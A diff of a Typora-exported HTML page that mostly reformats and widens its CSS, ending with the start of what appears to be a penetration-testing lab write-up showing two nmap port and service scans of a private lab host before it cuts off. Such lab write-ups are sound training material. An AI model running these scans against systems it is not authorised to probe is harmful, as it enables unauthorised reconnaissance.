@@ -316,33 +316,34 @@ span.cm-strikethrough { text-decoration: line-through; }
 /* pt-serif-700 - latin */
 /* pt-serif-700italic - latin */
 :root {
-	--active-file-bg-color: #dadada;
-	--active-file-bg-color: rgba(32, 43, 51, 0.63);
-	--active-file-text-color: white;
-	--bg-color: #f3f2ee;
-	--text-color: #1f0909;
-	--control-text-color: #444;
-	--rawblock-edit-panel-bd: #e5e5e5;
+  --active-file-bg-color: #dadada;
+  --active-file-bg-color: rgba(32, 43, 51, 0.63);
+  --active-file-text-color: white;
+  --bg-color: #f3f2ee;
+  --text-color: #1f0909;
+  --control-text-color: #444;
+  --rawblock-edit-panel-bd: #e5e5e5;
 
-	--select-text-bg-color: rgba(32, 43, 51, 0.63);
+  --select-text-bg-color: rgba(32, 43, 51, 0.63);
   --select-text-font-color: white;
 }
 
 pre {
-	--select-text-bg-color: #36284e;
-	--select-text-font-color: #fff;
+  --select-text-bg-color: #36284e;
+  --select-text-font-color: #fff;
 }
 
 html {
-	font-size: 16px;
-	-webkit-font-smoothing: antialiased;
+  font-size: 16px;
+  -webkit-font-smoothing: antialiased;
 }
 
-html, body {
-	background-color: #f3f2ee;
-	font-family: "PT Serif", 'Times New Roman', Times, serif;
-	color: #1f0909;
-	line-height: 1.5em;
+html,
+body {
+  background-color: #f3f2ee;
+  font-family: "PT Serif", "Times New Roman", Times, serif;
+  color: #1f0909;
+  line-height: 1.5em;
 }
 
 /*#write {
@@ -359,44 +360,56 @@ html, body {
  	}
 }*/
 
+/* #write {
+  max-width: 40em;
+} */
+
+/* @media only screen and (min-width: 1400px) {
+  #write {
+    max-width: 914px;
+  }
+} */
+
+/* 강제 적용 버전 */
 #write {
-	max-width: 40em;
+  max-width: 900px !important; /* 숫자를 더 키워보세요 */
+  width: 90% !important;
 }
 
 @media only screen and (min-width: 1400px) {
-	#write {
-			max-width: 914px;
-	}
+  #write {
+    max-width: 1400px !important;
+  }
 }
 
 ol li {
-	list-style-type: decimal;
-	list-style-position: outside;
+  list-style-type: decimal;
+  list-style-position: outside;
 }
 ul li {
-	list-style-type: disc;
-	list-style-position: outside;
+  list-style-type: disc;
+  list-style-position: outside;
 }
 
 ol,
 ul {
-	list-style: none;
+  list-style: none;
 }
 
 blockquote,
 q {
-	quotes: none;
+  quotes: none;
 }
 blockquote:before,
 blockquote:after,
 q:before,
 q:after {
-	content: '';
-	content: none;
+  content: "";
+  content: none;
 }
 table {
-	border-collapse: collapse;
-	border-spacing: 0;
+  border-collapse: collapse;
+  border-spacing: 0;
 }
 /* styles */
 
@@ -410,61 +423,61 @@ h3,
 h4,
 h5,
 h6 {
-	font-weight: bold;
+  font-weight: bold;
 }
 h1 {
-	font-size: 1.875em;
-	/*30 / 16*/
-	line-height: 1.6em;
-	/* 48 / 30*/
-	margin-top: 2em;
+  font-size: 1.875em;
+  /*30 / 16*/
+  line-height: 1.6em;
+  /* 48 / 30*/
+  margin-top: 2em;
 }
 h2,
 h3 {
-	font-size: 1.3125em;
-	/*21 / 16*/
-	line-height: 1.15;
-	/*24 / 21*/
-	margin-top: 2.285714em;
-	/*48 / 21*/
-	margin-bottom: 1.15em;
-	/*24 / 21*/
+  font-size: 1.3125em;
+  /*21 / 16*/
+  line-height: 1.15;
+  /*24 / 21*/
+  margin-top: 2.285714em;
+  /*48 / 21*/
+  margin-bottom: 1.15em;
+  /*24 / 21*/
 }
 h3 {
-	font-weight: normal;
+  font-weight: normal;
 }
 h4 {
-	font-size: 1.125em;
-	/*18 / 16*/
-	margin-top: 2.67em;
-	/*48 / 18*/
+  font-size: 1.125em;
+  /*18 / 16*/
+  margin-top: 2.67em;
+  /*48 / 18*/
 }
 h5,
 h6 {
-	font-size: 1em;
-	/*16*/
+  font-size: 1em;
+  /*16*/
 }
 h1 {
-	border-bottom: 1px solid;
-	margin-bottom: 1.875em;
-	padding-bottom: 0.8125em;
+  border-bottom: 1px solid;
+  margin-bottom: 1.875em;
+  padding-bottom: 0.8125em;
 }
 /* links */
 
 a {
-	text-decoration: none;
-	color: #065588;
+  text-decoration: none;
+  color: #065588;
 }
 a:hover,
 a:active {
-	text-decoration: underline;
+  text-decoration: underline;
 }
 /* block spacing */
 
 p,
 blockquote,
 .md-fences {
-	margin-bottom: 1.5em;
+  margin-bottom: 1.5em;
 }
 h1,
 h2,
@@ -472,80 +485,86 @@ h3,
 h4,
 h5,
 h6 {
-	margin-bottom: 1.5em;
+  margin-bottom: 1.5em;
 }
 /* blockquote */
 
 blockquote {
-	font-style: italic;
-	border-left: 5px solid;
-	margin-left: 2em;
-	padding-left: 1em;
+  font-style: italic;
+  border-left: 5px solid;
+  margin-left: 2em;
+  padding-left: 1em;
 }
 /* lists */
 
 ul,
 ol {
-	margin: 0 0 1.5em 1.5em;
+  margin: 0 0 1.5em 1.5em;
 }
 /* tables */
-.md-meta,.md-before, .md-after {
-	color:#999;
+.md-meta,
+.md-before,
+.md-after {
+  color: #999;
 }
 
 table {
-	margin-bottom: 1.5em;
-	/*24 / 16*/
-	font-size: 1em;
-	/* width: 100%; */
+  margin-bottom: 1.5em;
+  /*24 / 16*/
+  font-size: 1em;
+  /* width: 100%; */
 }
 thead th,
 tfoot th {
-	padding: .25em .25em .25em .4em;
-	text-transform: uppercase;
+  padding: 0.25em 0.25em 0.25em 0.4em;
+  text-transform: uppercase;
 }
 th {
-	text-align: left;
+  text-align: left;
 }
 td {
-	vertical-align: top;
-	padding: .25em .25em .25em .4em;
+  vertical-align: top;
+  padding: 0.25em 0.25em 0.25em 0.4em;
 }
 
 code,
 .md-fences {
-	background-color: #dadada;
+  background-color: #dadada;
 }
 
 code {
-	padding-left: 2px;
-	padding-right: 2px;
+  padding-left: 2px;
+  padding-right: 2px;
 }
 
 .md-fences {
-	margin-left: 2em;
-	margin-bottom: 3em;
-	padding-left: 1ch;
-	padding-right: 1ch;
+  margin-left: 2em;
+  margin-bottom: 3em;
+  padding-left: 1ch;
+  padding-right: 1ch;
+  font-size: 0.8em;
+  margin-left: 0 !important;
+  width: 90% !important; /* 100%에서 95%로 살짝 줄임 */
+  max-width: 90% !important; /* 최대치 고정 */
 }
 
 pre,
 code,
 tt {
-	font-size: .875em;
-	line-height: 1.714285em;
+  font-size: 0.875em;
+  line-height: 1.714285em;
 }
 /* some fixes */
 
 h1 {
-	line-height: 1.3em;
-	font-weight: normal;
-	margin-bottom: 0.5em;
+  line-height: 1.3em;
+  font-weight: normal;
+  margin-bottom: 0.5em;
 }
 
 p + ul,
-p + ol{
-	margin-top: .5em;
+p + ol {
+  margin-top: 0.5em;
 }
 
 h3 + ul,
@@ -556,154 +575,155 @@ h3 + ol,
 h4 + ol,
 h5 + ol,
 h6 + ol {
-	margin-top: .5em;
+  margin-top: 0.5em;
 }
 
 li > ul,
 li > ol {
-	margin-top: inherit;
-	margin-bottom: 0;
+  margin-top: inherit;
+  margin-bottom: 0;
 }
 
-li ol>li {
-	list-style-type: lower-alpha;
+li ol > li {
+  list-style-type: lower-alpha;
 }
 
-li li ol>li{
-	list-style-type: lower-roman;
+li li ol > li {
+  list-style-type: lower-roman;
 }
 
 h2,
 h3 {
-	margin-bottom: .75em;
+  margin-bottom: 0.75em;
 }
 hr {
-	border-top: none;
-	border-right: none;
-	border-bottom: 1px solid;
-	border-left: none;
+  border-top: none;
+  border-right: none;
+  border-bottom: 1px solid;
+  border-left: none;
 }
 h1 {
-	border-color: #c5c5c5;
+  border-color: #c5c5c5;
 }
 blockquote {
-	border-color: #bababa;
-	color: #656565;
+  border-color: #bababa;
+  color: #656565;
 }
 
 blockquote ul,
 blockquote ol {
-	margin-left:0;
+  margin-left: 0;
 }
 
 .ty-table-edit {
-	background-color: transparent;
+  background-color: transparent;
 }
 thead {
-	background-color: #dadada;
+  background-color: #dadada;
 }
 tr:nth-child(even) {
-	background: #e8e7e7;
+  background: #e8e7e7;
 }
 hr {
-	border-color: #c5c5c5;
+  border-color: #c5c5c5;
 }
-.task-list{
-	padding-left: 1rem;
+.task-list {
+  padding-left: 1rem;
 }
 
 .md-task-list-item {
-	padding-left: 1.5rem;
-	list-style-type: none;
+  padding-left: 1.5rem;
+  list-style-type: none;
 }
 
 .md-task-list-item > input:before {
-	content: '\221A';
-	display: inline-block;
-	width: 1.25rem;
-  	height: 1.6rem;
-	vertical-align: middle;
-	text-align: center;
-	color: #ddd;
-	background-color: #F3F2EE;
+  content: "\221A";
+  display: inline-block;
+  width: 1.25rem;
+  height: 1.6rem;
+  vertical-align: middle;
+  text-align: center;
+  color: #ddd;
+  background-color: #f3f2ee;
 }
 
 .md-task-list-item > input:checked:before,
-.md-task-list-item > input[checked]:before{
-	color: inherit;
+.md-task-list-item > input[checked]:before {
+  color: inherit;
 }
 
 #write pre.md-meta-block {
-	min-height: 1.875rem;
-	color: #555;
-	border: 0px;
-	background: transparent;
-	margin-top: -4px;
-	margin-left: 1em;
-	margin-top: 1em;
+  min-height: 1.875rem;
+  color: #555;
+  border: 0px;
+  background: transparent;
+  margin-top: -4px;
+  margin-left: 1em;
+  margin-top: 1em;
 }
 
-.md-image>.md-meta {
-	color: #9B5146;
+.md-image > .md-meta {
+  color: #9b5146;
 }
 
-.md-image>.md-meta{
-	font-family: Menlo, 'Ubuntu Mono', Consolas, 'Courier New', 'Microsoft Yahei', 'Hiragino Sans GB', 'WenQuanYi Micro Hei', serif;
+.md-image > .md-meta {
+  font-family:
+    Menlo, "Ubuntu Mono", Consolas, "Courier New", "Microsoft Yahei",
+    "Hiragino Sans GB", "WenQuanYi Micro Hei", serif;
 }
 
-
-#write>h3.md-focus:before{
-	left: -1.5rem;
-	color:#999;
-	border-color:#999;
+#write > h3.md-focus:before {
+  left: -1.5rem;
+  color: #999;
+  border-color: #999;
 }
-#write>h4.md-focus:before{
-	left: -1.5rem;
-	top: .25rem;
-	color:#999;
-	border-color:#999;
+#write > h4.md-focus:before {
+  left: -1.5rem;
+  top: 0.25rem;
+  color: #999;
+  border-color: #999;
 }
-#write>h5.md-focus:before{
-	left: -1.5rem;
-	top: .0.3125rem;
-	color:#999;
-	border-color:#999;
+#write > h5.md-focus:before {
+  left: -1.5rem;
+  top: 0.3125rem;
+  color: #999;
+  border-color: #999;
 }
-#write>h6.md-focus:before{
-	left: -1.5rem;
-	top: 0.3125rem;
-	color:#999;
-	border-color:#999;
-}
-
-.md-toc:focus .md-toc-content{
-	margin-top: 19px;
+#write > h6.md-focus:before {
+  left: -1.5rem;
+  top: 0.3125rem;
+  color: #999;
+  border-color: #999;
 }
 
-.md-toc-content:empty:before{
-	color: #065588;
+.md-toc:focus .md-toc-content {
+  margin-top: 19px;
+}
+
+.md-toc-content:empty:before {
+  color: #065588;
 }
 .md-toc-item {
-	color: #065588;
+  color: #065588;
 }
 #write div.md-toc-tooltip {
-	background-color: #f3f2ee;
+  background-color: #f3f2ee;
 }
 
 #typora-sidebar {
-	background-color: #f3f2ee;
-	-webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
-  	box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
+  background-color: #f3f2ee;
+  -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
+  box-shadow: 0 6px 12px rgba(0, 0, 0, 0.375);
 }
 
 .pin-outline #typora-sidebar {
-	background: inherit;
-	box-shadow: none;
-	border-right: 1px dashed;
+  background: inherit;
+  box-shadow: none;
+  border-right: 1px dashed;
 }
 
 .pin-outline #typora-sidebar:hover .outline-title-wrapper {
-	border-left:1px dashed;
+  border-left: 1px dashed;
 }
 
 .outline-item:hover {
@@ -713,225 +733,212 @@ hr {
 }
 
 .typora-node .outline-item:hover {
-  	border-right: 28px solid #dadada;
+  border-right: 28px solid #dadada;
 }
 
 .outline-expander:before {
   content: "\f0da";
   font-family: FontAwesome;
-  font-size:14px;
+  font-size: 14px;
   top: 1px;
 }
 
 .outline-expander:hover:before,
-.outline-item-open>.outline-item>.outline-expander:before {
+.outline-item-open > .outline-item > .outline-expander:before {
   content: "\f0d7";
 }
 
 .modal-content {
-	background-color: #f3f2ee;
+  background-color: #f3f2ee;
 }
 
 .auto-suggest-container ul li {
-	list-style-type: none;
+  list-style-type: none;
 }
 
 /** UI for electron */
 
 .megamenu-menu,
-#top-titlebar, #top-titlebar *,
+#top-titlebar,
+#top-titlebar *,
 .megamenu-content {
-	background: #f3f2ee;
-	color: #1f0909;
+  background: #f3f2ee;
+  color: #1f0909;
 }
 
 .megamenu-menu-header {
-	border-bottom: 1px dashed #202B33;
+  border-bottom: 1px dashed #202b33;
 }
 
 .megamenu-menu {
-	box-shadow: none;
-	border-right: 1px dashed;
+  box-shadow: none;
+  border-right: 1px dashed;
 }
 
-header, .context-menu, .megamenu-content, footer {
-	font-family: "PT Serif", 'Times New Roman', Times, serif;
-    color: #1f0909;
+header,
+.context-menu,
+.megamenu-content,
+footer {
+  font-family: "PT Serif", "Times New Roman", Times, serif;
+  color: #1f0909;
 }
 
 #megamenu-back-btn {
-	color: #1f0909;
-	border-color: #1f0909;
+  color: #1f0909;
+  border-color: #1f0909;
 }
 
 .megamenu-menu-header #megamenu-menu-header-title:before {
-	color: #1f0909;
+  color: #1f0909;
 }
 
-.megamenu-menu-list li a:hover, .megamenu-menu-list li a.active {
-	color: inherit;
-	background-color: #e8e7df;
+.megamenu-menu-list li a:hover,
+.megamenu-menu-list li a.active {
+  color: inherit;
+  background-color: #e8e7df;
 }
 
 .long-btn:hover {
-	background-color: #e8e7df;
+  background-color: #e8e7df;
 }
 
 #recent-file-panel tbody tr:nth-child(2n-1) {
-    background-color: transparent !important;
+  background-color: transparent !important;
 }
 
 .megamenu-menu-panel tbody tr:hover td:nth-child(2) {
-    color: inherit;
+  color: inherit;
 }
 
 .megamenu-menu-panel .btn {
-	background-color: #D2D1D1;
+  background-color: #d2d1d1;
 }
 
 .btn-default {
-	background-color: transparent;
+  background-color: transparent;
 }
 
 .typora-sourceview-on #toggle-sourceview-btn,
 .ty-show-word-count #footer-word-count {
-	background: #c7c5c5;
+  background: #c7c5c5;
 }
 
 #typora-quick-open {
-    background-color: inherit;
+  background-color: inherit;
 }
 
 .md-diagram-panel {
-	margin-top: 8px;
+  margin-top: 8px;
 }
 
 .file-list-item-file-name {
-	font-weight: initial;
+  font-weight: initial;
 }
 
 .file-list-item-summary {
-	opacity: 1;
+  opacity: 1;
 }
 
 .file-list-item {
-	color: #777;
+  color: #777;
 }
 
 .file-list-item.active {
-	background-color: inherit;
-	color: black;
+  background-color: inherit;
+  color: black;
 }
 
 .ty-side-sort-btn.active {
-	background-color: inherit;
+  background-color: inherit;
 }
 
-.file-list-item.active .file-list-item-file-name  {
-	font-weight: bold;
+.file-list-item.active .file-list-item-file-name {
+  font-weight: bold;
 }
 
-.file-list-item{
-    opacity:1 !important;
+.file-list-item {
+  opacity: 1 !important;
 }
 
-.file-library-node.active>.file-node-background{
-	background-color: rgba(32, 43, 51, 0.63);
-	background-color: var(--active-file-bg-color);
+.file-library-node.active > .file-node-background {
+  background-color: rgba(32, 43, 51, 0.63);
+  background-color: var(--active-file-bg-color);
 }
 
-.file-tree-node.active>.file-node-content{
-	color: white;
-	color: var(--active-file-text-color);
+.file-tree-node.active > .file-node-content {
+  color: white;
+  color: var(--active-file-text-color);
 }
 
-.md-task-list-item>input {
-	margin-left: -1.7em;
-	margin-top: calc(1rem - 12px);
-	-webkit-appearance: button;
+.md-task-list-item > input {
+  margin-left: -1.7em;
+  margin-top: calc(1rem - 12px);
+  -webkit-appearance: button;
 }
 
 input {
-	border: 1px solid #aaa;
+  border: 1px solid #aaa;
 }
 
 .megamenu-menu-header #megamenu-menu-header-title,
-.megamenu-menu-header:hover, 
+.megamenu-menu-header:hover,
 .megamenu-menu-header:focus {
-	color: inherit;
+  color: inherit;
 }
 
 .dropdown-menu .divider {
-	border-color: #e5e5e5;
-	opacity: 1;
+  border-color: #e5e5e5;
+  opacity: 1;
 }
 
 /* https://github.com/typora/typora-issues/issues/2046 */
 .os-windows-7 strong,
-.os-windows-7 strong  {
-	font-weight: 760;
+.os-windows-7 strong {
+  font-weight: 760;
 }
 
 .ty-preferences .btn-default {
-	background: transparent;
+  background: transparent;
 }
 
 .ty-preferences .window-header {
-	border-bottom: 1px dashed #202B33;
-	box-shadow: none;
+  border-bottom: 1px dashed #202b33;
+  box-shadow: none;
 }
 
-#sidebar-loading-template, #sidebar-loading-template.file-list-item {
-	color: #777;
+#sidebar-loading-template,
+#sidebar-loading-template.file-list-item {
+  color: #777;
 }
 
 .searchpanel-search-option-btn.active {
-	background: #777;
-	color: white;
+  background: #777;
+  color: white;
 }
 
-.export-detail, .light .export-detail, 
-.light .export-item.active, 
+.export-detail,
+.light .export-detail,
+.light .export-item.active,
 .light .export-items-list-control {
-	background: #e0e0e0;
-	border-radius: 2px;
-	font-weight: 700;
-	color: inherit
-}</style>
-<style type='text/css'  id="style-theme_user_css">/* 강제 적용 버전 */
-#write {
-    max-width: 900px !important; /* 숫자를 더 키워보세요 */
-    width: 90% !important;
+  background: #e0e0e0;
+  border-radius: 2px;
+  font-weight: 700;
+  color: inherit;
 }
-
-@media only screen and (min-width: 1400px) {
-    #write {
-        max-width: 1400px !important;
-    }
-}
-
-/* 코드 블록 강제 확장 */
-.md-fences,
-pre.md-fences,
-#write .md-fences {
-    margin-left: 0 !important;
-    margin-right: 0 !important;
-    width: 100% !important;
-    min-width: 100% !important;
-}</style>
+</style>
 <style type='text/css'  id="style-lp">ol, ul {padding-left: 40px}</style>
 
 <title>pc</title>
 </head>
 <body class='typora-export os-windows'><div class='typora-export-content'>
-<div id='write'  class=''><p><span>Writeup by wook413</span></p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n6"><a class="md-toc-inner" href="#enumeration">Enumeration</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n7"><a class="md-toc-inner" href="#nmap">Nmap</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n14"><a class="md-toc-inner" href="#initial-access">Initial Access</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n15"><a class="md-toc-inner" href="#http---8000">HTTP - 8000</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n20"><a class="md-toc-inner" href="#privilege-escalation">Privilege Escalation</a></span></p></div><h1 id='enumeration'><span>Enumeration</span></h1><h2 id='nmap'><span>Nmap</span></h2><p><span>I kicked things off by performing a full TCP port scan</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-Pn</span> <span class="cm-attribute">-n</span> <span class="cm-attribute">--open</span> <span class="cm-attribute">--min-rate</span> <span class="cm-number">3000</span> <span class="cm-attribute">-p-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-13</span> <span class="cm-number">01</span>:41 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.108.210</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.047s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Not shown: <span class="cm-number">65533</span> closed tcp ports (reset)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp &nbsp; open &nbsp;<span class="cm-builtin">ssh</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">8000</span>/tcp open  http-alt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">14</span>.14 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 272px;"></div><div class="CodeMirror-gutters" style="display: none; height: 272px;"></div></div></div></pre><p><span>Following the initial scan, I ran a targeted scan on the open ports.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3438px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-sC</span> <span class="cm-attribute">-sV</span> <span class="cm-attribute">-p</span> <span class="cm-number">22</span>,8000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-13</span> <span class="cm-number">01</span>:42 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.108.210</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.046s latency).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+<div id='write'  class=''><p><span>Writeup by wook413</span></p><div class='md-toc' mdtype='toc'><p class="md-toc-content" role="list"><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n3"><a class="md-toc-inner" href="#enumeration">Enumeration</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n4"><a class="md-toc-inner" href="#nmap">Nmap</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n11"><a class="md-toc-inner" href="#initial-access">Initial Access</a></span><span role="listitem" class="md-toc-item md-toc-h2" data-ref="n12"><a class="md-toc-inner" href="#http---8000">HTTP - 8000</a></span><span role="listitem" class="md-toc-item md-toc-h1" data-ref="n17"><a class="md-toc-inner" href="#privilege-escalation">Privilege Escalation</a></span></p></div><h1 id='enumeration'><span>Enumeration</span></h1><h2 id='nmap'><span>Nmap</span></h2><p><span>I kicked things off by performing a full TCP port scan</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded md-focus" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap CodeMirror-focused" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 96.7188px; left: 50.2656px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="" style="position: relative;"><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">┌──(kali㉿kali)-[~/Desktop]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">└─<span class="cm-def">$ nmap</span> <span class="cm-def">$IP</span> <span class="cm-attribute">-Pn</span> <span class="cm-attribute">-n</span> <span class="cm-attribute">--open</span> <span class="cm-attribute">--min-rate</span> <span class="cm-number">3000</span> <span class="cm-attribute">-p-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Starting Nmap <span class="cm-number">7</span>.95 ( &lt;https://nmap.org&gt; ) at <span class="cm-number">2026</span><span class="cm-attribute">-01-13</span> <span class="cm-number">01</span>:41 UTC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap scan report <span class="cm-keyword">for</span> <span class="cm-number">192</span>.168.108.210</span></pre><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Host is up (0.047s latency).</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Not shown: <span class="cm-number">65533</span> closed tcp ports (reset)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PORT &nbsp; &nbsp; STATE SERVICE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">22</span>/tcp &nbsp; open &nbsp;<span class="cm-builtin">ssh</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">8000</span>/tcp open  http-alt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
+</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Nmap <span class="cm-keyword">done</span>: <span class="cm-number">1</span> IP address (1 host up) scanned <span class="cm-keyword">in</span> <span class="cm-number">14</span>.14 seconds</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 241px;"></div><div class="CodeMirror-gutters" style="display: none; height: 241px;"></div></div></div></pre><p><span>Following the initial scan, I ran a targeted scan on the open ports.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 